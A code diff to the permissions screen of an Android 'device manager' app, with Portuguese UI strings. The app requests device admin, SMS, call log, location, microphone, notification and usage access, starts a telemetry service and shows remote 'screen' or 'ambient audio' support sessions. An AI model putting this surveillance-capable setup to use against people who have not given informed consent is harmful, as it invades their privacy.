@@ -3,33 +3,33 @@ package com.company.devicemgr.activities;
 import android.Manifest;
 import android.app.Activity;
 import android.app.AlertDialog;
-import android.app.AppOpsManager;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Intent;
-import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
-import android.text.TextUtils;
 import android.widget.Button;
 import android.widget.TextView;
 
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
-import com.company.devicemgr.R;
 import com.company.devicemgr.receivers.DeviceAdminReceiver;
+import com.company.devicemgr.services.ForegroundTelemetryService;
+import com.company.devicemgr.utils.DeviceIdentity;
 import com.company.devicemgr.utils.AppRuntime;
+
+import org.json.JSONObject;
 
 import java.util.ArrayList;
 import java.util.List;
 
 public class MainPermissionsActivity extends Activity {
-    Button btnDeviceAdmin, btnLocationPerm, btnStoragePerm, btnCallLogPerm, btnSmsPerm, btnNotifAccess, btnUsageAccess, btnStartService, btnPickMedia;
-    TextView tvStatus, tvDeviceId;
+    Button btnDeviceAdmin, btnLocationPerm, btnStoragePerm, btnCallLogPerm, btnSmsPerm, btnNotifAccess, btnUsageAccess, btnStartService, btnPickMedia, btnStopSupportSession;
+    TextView tvStatus, tvDeviceId, tvSupportSessionStatus;
     private static final int REQ_CODE_DEVICE_ADMIN = 1001;
     private static final int REQ_CODE_PERMS = 2001;
     private static final int REQ_PICK_MEDIA = 3001;
@@ -41,62 +41,95 @@ public class MainPermissionsActivity extends Activity {
     @Override
     protected void onCreate(Bundle s) {
         super.onCreate(s);
-        setContentView(R.layout.activity_main_permissions);
+        setContentView(com.company.devicemgr.R.layout.activity_main_permissions);
 
-        btnDeviceAdmin = findViewById(R.id.btnDeviceAdmin);
-        btnLocationPerm = findViewById(R.id.btnLocationPerm);
-        btnStoragePerm = findViewById(R.id.btnStoragePerm);
-        btnCallLogPerm = findViewById(R.id.btnCallLogPerm);
-        btnSmsPerm = findViewById(R.id.btnSmsPerm);
-        btnNotifAccess = findViewById(R.id.btnNotifAccess);
-        btnUsageAccess = findViewById(R.id.btnUsageAccess);
-        btnStartService = findViewById(R.id.btnStartService);
-        btnPickMedia = findViewById(R.id.btnPickMedia);
+        btnDeviceAdmin = findViewById(com.company.devicemgr.R.id.btnDeviceAdmin);
+        btnLocationPerm = findViewById(com.company.devicemgr.R.id.btnLocationPerm);
+        btnStoragePerm = findViewById(com.company.devicemgr.R.id.btnStoragePerm);
+        btnCallLogPerm = findViewById(com.company.devicemgr.R.id.btnCallLogPerm);
+        btnSmsPerm = findViewById(com.company.devicemgr.R.id.btnSmsPerm);
+        btnNotifAccess = findViewById(com.company.devicemgr.R.id.btnNotifAccess);
+        btnUsageAccess = findViewById(com.company.devicemgr.R.id.btnUsageAccess);
+        btnStartService = findViewById(com.company.devicemgr.R.id.btnStartService);
+        btnPickMedia = findViewById(com.company.devicemgr.R.id.btnPickMedia);
+        btnStopSupportSession = findViewById(com.company.devicemgr.R.id.btnStopSupportSession);
 
-        tvStatus = findViewById(R.id.tvStatus);
-        tvDeviceId = findViewById(R.id.tvDeviceId);
+        tvStatus = findViewById(com.company.devicemgr.R.id.tvStatus);
+        tvDeviceId = findViewById(com.company.devicemgr.R.id.tvDeviceId);
+        tvSupportSessionStatus = findViewById(com.company.devicemgr.R.id.tvSupportSessionStatus);
 
-        final SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
-        final String deviceId = sp.getString("deviceId", "não atribuído");
-        tvDeviceId.setText("DeviceId: " + deviceId + "\nPacote: " + getPackageName());
+        final android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
+        String deviceId = sp.getString("deviceId", null);
+        if (deviceId == null || deviceId.trim().isEmpty()) {
+            deviceId = DeviceIdentity.getStableDeviceId(this);
+            sp.edit().putString("deviceId", deviceId).apply();
+        }
+        tvDeviceId.setText("DeviceId: " + deviceId);
 
-        btnDeviceAdmin.setOnClickListener(v -> requestDeviceAdmin());
+        btnDeviceAdmin.setOnClickListener(v -> {
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+            ComponentName adminComp = new ComponentName(MainPermissionsActivity.this, DeviceAdminReceiver.class);
+            if (!dpm.isAdminActive(adminComp)) {
+                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp);
+                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Necessário para bloqueio temporário e políticas.");
+                startActivityForResult(intent, REQ_CODE_DEVICE_ADMIN);
+            } else {
+                showMsg("Device Admin já activo");
+            }
+        });
+
         btnLocationPerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{
                 Manifest.permission.ACCESS_FINE_LOCATION,
                 Manifest.permission.ACCESS_COARSE_LOCATION
         }));
+
         btnStoragePerm.setOnClickListener(v -> requestPermissionsIfNeeded(getStoragePermissionsForCurrentVersion()));
+
         btnCallLogPerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{Manifest.permission.READ_CALL_LOG}));
+
         btnSmsPerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{
                 Manifest.permission.READ_SMS,
                 Manifest.permission.READ_PHONE_STATE,
                 Manifest.permission.RECORD_AUDIO
         }));
-        btnNotifAccess.setOnClickListener(v -> openNotificationAccessSettings());
-        btnUsageAccess.setOnClickListener(v -> openUsageAccessSettings());
-        btnStartService.setOnClickListener(v -> confirmAndStartService(sp));
-        btnPickMedia.setOnClickListener(v -> openDocumentPicker());
+
+        btnNotifAccess.setOnClickListener(v -> {
+            requestNotificationPermissionIfNeeded();
+            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
+        });
+
+        btnUsageAccess.setOnClickListener(v -> startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)));
+
+        btnStartService.setOnClickListener(v -> {
+            boolean active = sp.getBoolean("active", false);
+            if (!active) {
+                new AlertDialog.Builder(MainPermissionsActivity.this)
+                        .setTitle("Aviso")
+                        .setMessage("A conta pode não estar activada. Continua?")
+                        .setPositiveButton("Sim", (d, which) -> startTelemetryService())
+                        .setNegativeButton("Não", null)
+                        .show();
+            } else {
+                startTelemetryService();
+            }
+        });
+
+        btnPickMedia.setOnClickListener(v -> {
+            Intent i = new Intent(Intent.ACTION_OPEN_DOCUMENT);
+            i.addCategory(Intent.CATEGORY_OPENABLE);
+            i.setType("*/*");
+            i.putExtra(Intent.EXTRA_MIME_TYPES, new String[]{"image/*", "video/*"});
+            startActivityForResult(i, REQ_PICK_MEDIA);
+        });
+
+        btnStopSupportSession.setOnClickListener(v -> {
+            AppRuntime.requestSupportSessionStop(this);
+            showMsg("Pedido de paragem enviado");
+            updateSupportSessionStatus();
+        });
 
         updateStatusText();
-    }
-
-    @Override
-    protected void onResume() {
-        super.onResume();
-        updateStatusText();
-    }
-
-    private void requestDeviceAdmin() {
-        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-        ComponentName adminComp = new ComponentName(this, DeviceAdminReceiver.class);
-        if (dpm != null && !dpm.isAdminActive(adminComp)) {
-            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp);
-            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Necessário para bloqueio temporário e políticas.");
-            startActivityForResult(intent, REQ_CODE_DEVICE_ADMIN);
-        } else {
-            showMsg("Device Admin já ativo");
-        }
     }
 
     private String[] getStoragePermissionsForCurrentVersion() {
@@ -109,74 +142,10 @@ public class MainPermissionsActivity extends Activity {
         return new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE};
     }
 
-    private void openNotificationAccessSettings() {
-        requestNotificationPermissionIfNeeded();
-        Intent direct = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_DETAIL_SETTINGS)
-                .putExtra(Settings.EXTRA_NOTIFICATION_LISTENER_COMPONENT_NAME,
-                        new ComponentName(this, com.company.devicemgr.services.NotificationListenerSvc.class).flattenToString());
-        if (direct.resolveActivity(getPackageManager()) != null) {
-            startActivity(direct);
-            showMsg("Abrindo acesso a notificações do app...");
-            return;
-        }
-        startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
-        showMsg("Se o app não aparecer, procure por " + getPackageName());
-    }
-
-    private void openUsageAccessSettings() {
-        Intent usageIntent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
-        if (usageIntent.resolveActivity(getPackageManager()) != null) {
-            startActivity(usageIntent);
-        } else {
-            startActivity(new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + getPackageName())));
-        }
-        showMsg("Procure por " + getPackageName() + " e ative 'Acesso ao uso'.");
-    }
-
     private void requestNotificationPermissionIfNeeded() {
         if (Build.VERSION.SDK_INT >= ANDROID_13_API_LEVEL) {
             requestPermissionsIfNeeded(new String[]{POST_NOTIFICATIONS_PERMISSION});
         }
-    }
-
-    private void confirmAndStartService(SharedPreferences sp) {
-        boolean active = sp.getBoolean("active", false);
-        if (!active) {
-            new AlertDialog.Builder(this)
-                    .setTitle("Aviso")
-                    .setMessage("A conta pode não estar ativa. Continua?")
-                    .setPositiveButton("Sim", (d, which) -> startTelemetryService())
-                    .setNegativeButton("Não", null)
-                    .show();
-        } else {
-            startTelemetryService();
-        }
-    }
-
-    private void openDocumentPicker() {
-        Intent i = new Intent(Intent.ACTION_OPEN_DOCUMENT);
-        i.addCategory(Intent.CATEGORY_OPENABLE);
-        i.setType("*/*");
-        i.putExtra(Intent.EXTRA_MIME_TYPES, new String[]{"image/*", "video/*"});
-        startActivityForResult(i, REQ_PICK_MEDIA);
-    }
-
-    private boolean hasUsageAccessPermission() {
-        AppOpsManager appOps = (AppOpsManager) getSystemService(APP_OPS_SERVICE);
-        if (appOps == null) return false;
-        int mode;
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            mode = appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), getPackageName());
-        } else {
-            mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), getPackageName());
-        }
-        return mode == AppOpsManager.MODE_ALLOWED;
-    }
-
-    private boolean isNotificationAccessEnabled() {
-        String enabled = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
-        if (TextUtils.isEmpty(enabled)) return false;
-        return enabled.contains(getPackageName());
     }
 
     private void startTelemetryService() {
@@ -199,16 +168,33 @@ public class MainPermissionsActivity extends Activity {
     }
 
     private void updateStatusText() {
-        SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
+        android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
         String token = sp.getString("auth_token", null);
-        String deviceId = sp.getString("deviceId", "não atribuído");
-        List<String> states = new ArrayList<>();
-        states.add("Token: " + (token != null ? "OK" : "ausente"));
-        states.add("Notificações: " + (isNotificationAccessEnabled() ? "OK" : "pendente"));
-        states.add("Uso do aparelho: " + (hasUsageAccessPermission() ? "OK" : "pendente"));
-        states.add("Serviço: " + (sp.getBoolean("service_started", false) ? "ativo" : "parado"));
-        tvStatus.setText(TextUtils.join("\n", states));
-        tvDeviceId.setText("DeviceId: " + deviceId + "\nPacote: " + getPackageName());
+        String deviceId = sp.getString("deviceId", null);
+        tvStatus.setText("Token: " + (token != null ? "OK" : "missing"));
+        tvDeviceId.setText("DeviceId: " + deviceId);
+        updateSupportSessionStatus();
+    }
+
+    private void updateSupportSessionStatus() {
+        android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
+        String raw = sp.getString("active_support_session_json", null);
+        if (raw == null || raw.trim().isEmpty()) {
+            tvSupportSessionStatus.setText("Sessão de suporte: nenhuma");
+            btnStopSupportSession.setEnabled(false);
+            return;
+        }
+
+        try {
+            JSONObject session = new JSONObject(raw);
+            String requestType = session.optString("requestType", "screen");
+            String expiresAt = session.optString("sessionExpiresAt", "-");
+            tvSupportSessionStatus.setText("Sessão de suporte: " + ("ambient_audio".equals(requestType) ? "áudio" : "ecrã") + " até " + expiresAt);
+            btnStopSupportSession.setEnabled(true);
+        } catch (Exception e) {
+            tvSupportSessionStatus.setText("Sessão de suporte: estado indisponível");
+            btnStopSupportSession.setEnabled(false);
+        }
     }
 
     private void requestPermissionsIfNeeded(String[] perms) {
@@ -229,15 +215,18 @@ public class MainPermissionsActivity extends Activity {
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == REQ_CODE_DEVICE_ADMIN) {
-            showMsg(resultCode == RESULT_OK ? "Device Admin ativado" : "Device Admin não ativado");
+            if (resultCode == RESULT_OK) {
+                showMsg("Device Admin activado");
+            } else {
+                showMsg("Device Admin não activado");
+            }
         } else if (requestCode == REQ_PICK_MEDIA && resultCode == RESULT_OK && data != null) {
             Uri uri = data.getData();
             if (uri != null) {
-                showMsg("Media selecionada: " + uri);
+                showMsg("Media seleccionada: " + uri.toString());
                 getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).edit().putString("last_media_uri", uri.toString()).apply();
             }
         }
-        updateStatusText();
     }
 
     @Override
@@ -252,7 +241,12 @@ public class MainPermissionsActivity extends Activity {
                 }
             }
             showMsg(ok ? "Permissões concedidas" : "Algumas permissões não concedidas");
-            updateStatusText();
         }
+    }
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        updateStatusText();
     }
 }
